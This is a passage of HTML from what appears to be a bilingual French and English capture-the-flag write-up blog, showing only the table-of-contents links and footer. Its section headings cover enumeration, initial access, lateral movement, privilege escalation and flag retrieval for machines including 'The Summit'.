href=#accès-initial-shell-en-tant-que-rose>Accès initial (shell en tant que rose)</a><ul><li><a href=#mouvement-latéral-shell-en-tant-que-jsmith>Mouvement latéral (shell en tant que j.smith)</a></li></ul></li><li><a href=#what-are-the-usernames-found-on-the-server>What are the usernames found on the server?</a></li><li><a href=#what-is-the-root-flag-1>What is the root flag?</a></li><li><a href=#what-is-the-administrators-ntlm-hash>What is the Administrator&rsquo;s NTLM hash?</a><ul><li><a href=#elévation-de-privilèges-1>Elévation de Privilèges</a></li></ul></li></ul></li><li><a href=#the-summit>The Summit</a><ul><li><a href=#balayage-the-summit>Balayage (The Summit)</a></li><li><a href=#what-is-the-user-flag-2>What is the user flag?</a><ul><li><a href=#enumération-2>Enumération</a></li><li><a href=#accès-initial-shell-en-tant-que-jsmith>Accès initial (shell en tant que j.smith)</a></li><li><a href=#mouvement-latéral-shell-en-tant-que-oarmstrong>Mouvement latéral (shell en tant que o.armstrong)</a></li></ul></li><li><a href=#what-is-the-root-flag-2>What is the root flag?</a><ul><li><a href=#elévation-de-privilèges-2>Elévation de Privilèges</a></li></ul></li><li><a href=#références>Références</a></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2024 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>